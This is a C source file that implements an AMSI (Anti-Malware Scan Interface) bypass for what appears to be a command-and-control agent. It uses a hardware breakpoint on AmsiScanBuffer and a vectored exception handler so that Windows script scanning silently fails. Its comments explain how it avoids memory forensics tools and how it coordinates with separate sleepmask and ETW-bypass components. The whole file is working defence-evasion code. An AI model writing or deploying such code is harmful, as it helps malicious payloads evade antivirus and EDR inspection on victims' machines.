// amsi.c — AMSI (Anti-Malware Scan Interface) bypass
//
// AMSI is Windows' built-in content-scanning interface. PowerShell, VBScript,
// Office macros, and .NET 4.8+ all submit script content to AMSI before
// execution. Defenders AND EDRs (CrowdStrike, SentinelOne, Defender for
// Endpoint) hook AmsiScanBuffer to inspect in-memory payloads.
//
// TECHNIQUE POLICY (operator decision — keep only what is REAL and STEALTHY):
//   Kept : Hardware Breakpoint (DR2 + VEH) — NO memory modification.
//   Kept : None — no patching, minimal footprint when the target is clean.
//   Removed: classic / memcpy / force-fail byte patches — all of them write
//   patch bytes into amsi.dll's .text, which Moneta, Volatility and
//   Velociraptor YARA scans flag immediately. Only the HWBP technique leaves
//   original bytes intact.
//
// DEBUG REGISTER MAP (avoids conflicts between features):
//   DR0 — Shadow7 sleepmask (Phantom)      [do not use here]
//   DR1 — ETW bypass (etw.c hwbp)          [do not use here]
//   DR2 — AMSI bypass (this file)
//   DR3 — free
//
// Compilation: built by build.rs via x86_64-w64-mingw32-gcc
// Linking:     Rust FFI in evasion/mod.rs
//
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

// Runtime status flag — set to 1 when the AMSI bypass is armed
static int g_amsi_applied = 0;
// Which technique was used: 0=none, 1=hwbp
static int g_amsi_technique_used = -1;

// ============================================================
// Technique 0: NONE — no patching (agent still runs)
// ============================================================
// Some scenarios (e.g., target with no Defender) don't need an AMSI bypass.
// Returning success without touching anything keeps the footprint minimal.
static int amsi_none(void) {
    g_amsi_technique_used = 0;
    return 0;
}

// ============================================================
// Technique 1: HARDWARE BREAKPOINT on DR2 (no memory modification)
// ============================================================
// Sets a hardware breakpoint (DR2) on AmsiScanBuffer. When the function is
// called, a SINGLE_STEP exception fires, our VEH handler intercepts, sets
// RAX = E_INVALIDARG, and returns to the caller — the scan never happens.
//
// Pros: NO memory modification — Moneta/Volatility see original bytes
//       Survives AmsiScanBuffer re-loading
//       DR2 keeps us clear of Shadow7 (DR0) and ETW bypass (DR1)
// Cons: VEH registration itself is a minor telemetry point
//       x64 only (uses RIP/CONTEXT_RAX)
//
// This is the technique Nighthawk uses internally.
//
static int g_amsi_handler_installed = 0;
static PVOID g_amsi_veh = NULL;
static void* g_amsi_target = NULL;

static LONG WINAPI amsi_veh_handler(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if ((void*)ep->ContextRecord->Rip == g_amsi_target) {
            // Skip function: return E_INVALIDARG
            ep->ContextRecord->Rax = 0x80070057;
            // Return to caller without executing the scan
            ep->ContextRecord->Rip = *(ULONG64*)ep->ContextRecord->Rsp;
            ep->ContextRecord->Rsp += 8;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static int amsi_hw_bp_patch(void) {
    if (g_amsi_handler_installed) return 0;

    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return 1;

    FARPROC func = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!func) return 2;

    g_amsi_target = (void*)func;
    g_amsi_veh = AddVectoredExceptionHandler(1, amsi_veh_handler);
    if (!g_amsi_veh) return 3;

    // Set DR2 = target, DR7 = enable local DR2 breakpoint on execution
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();
    if (!GetThreadContext(hThread, &ctx)) {
        RemoveVectoredExceptionHandler(g_amsi_veh);
        return 4;
    }
    ctx.Dr2 = (ULONG64)func;
    // DR7 layout: L0=bit0 G0=bit1 L1=bit2 G1=bit3 L2=bit4 G2=bit5 ...
    //             R/W2=bits24-25, LEN2=bits26-27
    // Enable L2 (0x10) and force R/W2=00 LEN2=00 (execute, 1 byte) WITHOUT
    // touching the other debug-register enables (Shadow7/ETW may own them).
    ctx.Dr7 = (ctx.Dr7 & ~(0xFu << 24)) | 0x10u;
    if (!SetThreadContext(hThread, &ctx)) {
        RemoveVectoredExceptionHandler(g_amsi_veh);
        return 5;
    }
    g_amsi_handler_installed = 1;
    g_amsi_applied = 1;
    g_amsi_technique_used = 1;
    return 0;
}

// ============================================================
// Runtime status check — called from Rust via FFI
// Returns: 1 if AMSI bypass armed, 0 if not
// ============================================================
int amsi_is_patched(void) {
    return g_amsi_applied;
}

// Returns: technique ID used (0=none, 1=hwbp), or -1 if not applied
int amsi_get_technique(void) {
    return g_amsi_technique_used;
}

// ============================================================
// Dispatcher — called from Rust via FFI
// technique: 0=none, 1=hwbp (DR2)
// Unknown values fall through to the HWBP stealth default.
// ============================================================
int amsi_apply(int technique) {
    switch (technique) {
        case 0: return amsi_none();
        case 1:
        default: return amsi_hw_bp_patch();
    }
}
